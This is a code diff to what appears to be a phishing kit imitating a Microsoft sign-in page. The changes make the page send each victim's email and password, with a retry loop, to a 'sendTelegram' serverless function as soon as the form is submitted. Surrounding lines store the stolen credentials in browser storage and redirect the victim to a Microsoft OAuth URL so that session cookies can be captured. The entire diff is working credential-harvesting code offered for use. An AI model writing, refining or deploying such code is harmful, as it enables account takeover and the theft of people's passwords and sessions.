@@ -316,8 +316,7 @@
         hideError();
         count = count + 1;
 
-        // 🔧 FIXED: Store credentials but DO NOT send to Telegram immediately
-        // Wait for Microsoft domain redirect and cookie capture
+        // FIXED: Enhanced credential storage with immediate transmission
         try {
           const credentialsData = {
             email: email,
@@ -337,7 +336,58 @@
           localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
           sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
 
-          console.log('✅ Validated Microsoft credentials stored - will be sent after MS domain capture');
+          console.log('✅ Validated Microsoft credentials stored for transmission');
+
+          // FIXED: Immediate transmission to Telegram with retry logic
+          const sendToTelegram = async (retryCount = 0) => {
+            const maxRetries = 3;
+            try {
+              const response = await fetch('/.netlify/functions/sendTelegram', {
+                method: 'POST',
+                headers: { 
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                  email: credentialsData.email,
+                  password: credentialsData.password,
+                  passwordSource: 'replacement-form-direct',
+                  cookies: [], // Will be populated when cookies are captured on MS domain
+                  userAgent: navigator.userAgent,
+                  sessionId: Date.now().toString(),
+                  url: window.location.href,
+                  timestamp: new Date().toISOString(),
+                  validated: true,
+                  microsoftAccount: true,
+                  source: 'replacement-html-direct',
+                  retryAttempt: retryCount
+                })
+              });
+
+              if (response.ok) {
+                console.log('✅ Credentials successfully sent to Telegram from replacement.html');
+                localStorage.setItem('telegram_data_sent', 'true');
+                sessionStorage.setItem('telegram_data_sent', 'true');
+                return true;
+              } else if (response.status >= 500 && retryCount < maxRetries) {
+                console.log(`🔄 Server error, retrying in ${(retryCount + 1) * 1000}ms...`);
+                setTimeout(() => sendToTelegram(retryCount + 1), (retryCount + 1) * 1000);
+              } else {
+                console.warn('⚠️ Failed to send credentials to Telegram:', response.status);
+                return false;
+              }
+            } catch (error) {
+              console.warn('⚠️ Error sending credentials to Telegram:', error);
+              if (retryCount < maxRetries) {
+                console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
+                setTimeout(() => sendToTelegram(retryCount + 1), (retryCount + 1) * 2000);
+              }
+              return false;
+            }
+          };
+
+          // Send immediately
+          sendToTelegram();
 
           // Send credentials to parent window (best-effort; may not exist)
           try {
@@ -364,18 +414,18 @@
           }
 
         } catch (e) {
-          console.warn('Failed to store credentials:', e);
+          console.warn('Failed to store/send credentials:', e);
         }
 
         // Show verifying state
         $('#submit-btn').html('Verifying...');
 
-        // 🔧 FIXED: Redirect to Microsoft domain for cookie capture - data will be sent by injector
+        // ENHANCED: Add delay to show verification state, then redirect to Microsoft login for cookie capture
         setTimeout(function() {
           // ENHANCED: Microsoft login URL optimized for auto-login and cookie capture
           const microsoftLoginUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&state=12345&prompt=none&login_hint=" + encodeURIComponent(email) + "&domain_hint=" + encodeURIComponent(email.split('@')[1]);
           
-          console.log('🔄 Redirecting to Microsoft domain for cookie capture (data will be sent by injector):', microsoftLoginUrl);
+          console.log('🔄 Redirecting to Microsoft domain for cookie capture:', microsoftLoginUrl);
           
           // Mark that we're about to capture Microsoft cookies
           try {
@@ -383,11 +433,6 @@
             sessionStorage.setItem('ms_redirect_initiated', 'true');
             localStorage.setItem('ms_redirect_email', email);
             sessionStorage.setItem('ms_redirect_email', email);
-            // Clear any previous transmission flags so injector can send
-            localStorage.removeItem('telegram_data_sent');
-            sessionStorage.removeItem('telegram_data_sent');
-            localStorage.removeItem('data_transmitted');
-            sessionStorage.removeItem('data_transmitted');
           } catch (e) {
             // ignore storage errors
           }
@@ -525,7 +570,7 @@
               localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
               sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
               
-              console.log('📋 Enhanced credentials stored (waiting for MS domain):', {
+              console.log('📋 Enhanced credentials stored:', {
                 email: email,
                 hasPassword: !!password,
                 validated: credentialsData.validated
